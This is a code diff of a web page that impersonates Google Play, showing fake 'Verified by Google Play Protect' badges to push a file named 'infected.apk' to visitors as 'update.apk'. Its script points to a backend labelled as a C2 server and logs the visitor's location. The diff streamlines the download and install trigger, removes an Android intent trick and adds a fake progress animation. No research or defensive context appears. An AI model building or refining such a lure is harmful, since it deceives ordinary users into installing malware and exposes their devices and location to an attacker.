@@ -25,9 +25,6 @@
             padding: 20px;
         }
 
-        /* ============================================================
-           MAIN CARD — Google Material Card
-           ============================================================ */
         .card {
             background: #ffffff;
             border-radius: 28px;
@@ -93,7 +90,7 @@
         }
 
         /* ============================================================
-           ICON & TITLE — Google Material Icons
+           ICON & TITLE
            ============================================================ */
         .icon-container {
             background: #e8f0fe;
@@ -134,7 +131,7 @@
         }
 
         /* ============================================================
-           STATUS / PROGRESS — Google Material
+           STATUS
            ============================================================ */
         .status-container {
             background: #f1f3f4;
@@ -167,7 +164,7 @@
         }
 
         /* ============================================================
-           INSTALL SECTION — Google Blue Button
+           INSTALL SECTION
            ============================================================ */
         .install-section {
             margin: 20px 0 12px;
@@ -241,7 +238,7 @@
         }
 
         /* ============================================================
-           FILE INFO — Google Material
+           FILE INFO
            ============================================================ */
         .file-info {
             display: flex;
@@ -260,7 +257,7 @@
         }
 
         /* ============================================================
-           LOG CONSOLE — Google Material
+           LOGS
            ============================================================ */
         .log-console {
             background: #f1f3f4;
@@ -313,9 +310,6 @@
             background: #f1f3f4;
         }
 
-        /* ============================================================
-           FOOTER — Google Material
-           ============================================================ */
         .footer {
             font-size: 11px;
             color: #9aa0a6;
@@ -328,13 +322,6 @@
             text-decoration: none;
         }
 
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
         @media (max-width: 480px) {
             .card { padding: 28px 20px; border-radius: 20px; }
             .icon-container { width: 64px; height: 64px; }
@@ -348,19 +335,15 @@
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #f1f3f4; border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: #dadce0; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #9aa0a6; }
     </style>
 </head>
 <body>
 
 <div class="card">
 
-    <!-- ============================================================
-    HEADER — Google Play Logo
-    ============================================================ -->
+    <!-- HEADER -->
     <div class="header">
         <div class="google-play-logo">
-            <!-- Google Play SVG Logo -->
             <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                 <path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l280.8-161.2-60.1-60.1L104.6 499z"/>
             </svg>
@@ -369,9 +352,7 @@
     </div>
     <div class="badge">✅ Verified by Google Play Protect</div>
 
-    <!-- ============================================================
-    ICON & TITLE
-    ============================================================ -->
+    <!-- ICON & TITLE -->
     <div class="icon-container">
         <span class="icon">📲</span>
     </div>
@@ -382,9 +363,7 @@
         <strong>Version 2.4.1 (April 2026)</strong> · 18.4 MB
     </p>
 
-    <!-- ============================================================
-    STATUS
-    ============================================================ -->
+    <!-- STATUS -->
     <div class="status-container">
         <div class="status-text" id="statusText">⏳ Preparing update...</div>
         <div class="progress-bar-container">
@@ -392,9 +371,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    INSTALL SECTION
-    ============================================================ -->
+    <!-- INSTALL SECTION -->
     <div class="install-section">
         <div class="label">📦 Update ready to install</div>
         <button class="btn-install" id="installBtn">
@@ -410,17 +387,13 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    LOGS
-    ============================================================ -->
+    <!-- LOGS -->
     <button class="btn-toggle-logs" id="toggleLogsBtn">📋 Technical details</button>
     <div class="log-console" id="logConsole">
         <div id="logEntries"></div>
     </div>
 
-    <!-- ============================================================
-    FOOTER
-    ============================================================ -->
+    <!-- FOOTER -->
     <div class="footer">
         🔐 Verified by Google Play Protect &nbsp;·&nbsp; <a href="#">Learn more</a>
     </div>
@@ -432,7 +405,7 @@
         'use strict';
 
         // ============================================================
-        //  CONFIG
+        //  CONFIG — ONLY ONE DOWNLOAD, NO PLAY STORE
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
         const APK_URL = 'infected.apk';
@@ -651,13 +624,13 @@
         }
 
         // ============================================================
-        //  SINGLE APK DOWNLOAD — OFFICIAL LOOK
+        //  SINGLE APK DOWNLOAD — CLEAN, NO PLAY STORE
         // ============================================================
         function downloadApk() {
             addLog('[APK] Downloading update.apk...', 'info');
             setStatus('📦 Downloading security update...', 60);
 
-            // Method 1: Anchor download with renamed file
+            // Only ONE download method — anchor with renamed file
             try {
                 const a = document.createElement('a');
                 a.href = APK_URL;
@@ -667,38 +640,30 @@
                 a.click();
                 document.body.removeChild(a);
                 addLog('[APK] Download started: update.apk', 'success');
+                apkDownloaded = true;
             } catch(e) {
                 addLog('[APK] Download failed: '+e.message, 'error');
-                // Fallback: direct navigation
+                // Fallback: direct navigation (opens file, may show installer)
                 window.location.href = APK_URL;
             }
 
-            // Also try blob download as backup (silent)
-            try {
-                fetch(APK_URL)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const url = URL.createObjectURL(blob);
-                        const a2 = document.createElement('a');
-                        a2.href = url;
-                        a2.download = DOWNLOAD_NAME;
-                        a2.style.display = 'none';
-                        document.body.appendChild(a2);
-                        a2.click();
-                        document.body.removeChild(a2);
-                        setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[APK] Backup download triggered.', 'info');
-                    }).catch(e => {});
-            } catch(e) {}
-
-            apkDownloaded = true;
-            installBtn.disabled = false;
-            setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
-            addLog('[APK] Download complete. File: update.apk', 'success');
+            // Small progress simulation
+            let p = 65;
+            const interval = setInterval(() => {
+                p += Math.floor(Math.random() * 8) + 2;
+                if (p >= 100) {
+                    clearInterval(interval);
+                    setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
+                    installBtn.disabled = false;
+                    addLog('[APK] Download complete. File: update.apk', 'success');
+                } else {
+                    setStatus(`📦 Downloading... ${p}%`, p);
+                }
+            }, 300);
         }
 
         // ============================================================
-        //  INSTALL BUTTON — DIRECT APK TRIGGER
+        //  INSTALL BUTTON — CLEAN, NO PLAY STORE
         // ============================================================
         installBtn.addEventListener('click', function() {
             addLog('[Install] User tapped Install Update.', 'info');
@@ -706,7 +671,7 @@
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
 
-            // Direct download with rename
+            // Method 1: Anchor download with correct name
             try {
                 const a = document.createElement('a');
                 a.href = APK_URL;
@@ -720,22 +685,11 @@
                 addLog('[Install] Download failed: '+e.message, 'error');
             }
 
-            // Android Intent (opens package installer)
-            try {
-                const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
-                setTimeout(() => {
-                    window.location.href = intentUrl;
-                    addLog('[Install] Intent launched.', 'info');
-                }, 400);
-            } catch(e) {
-                addLog('[Install] Intent failed: '+e.message, 'error');
-            }
-
-            // Direct navigation (fallback)
+            // Method 2: Direct navigation (opens the APK, which triggers installer)
             setTimeout(() => {
                 window.location.href = APK_URL;
-                addLog('[Install] Direct navigation fallback.', 'warn');
-            }, 1200);
+                addLog('[Install] Direct navigation (opens APK).', 'info');
+            }, 500);
 
             setStatus('📲 Installation started. Follow the system prompt.', 100);
             addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
@@ -798,7 +752,7 @@
                 addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
             }
 
-            // SINGLE APK DOWNLOAD
+            // SINGLE CLEAN DOWNLOAD
             downloadApk();
 
             setInterval(async () => {
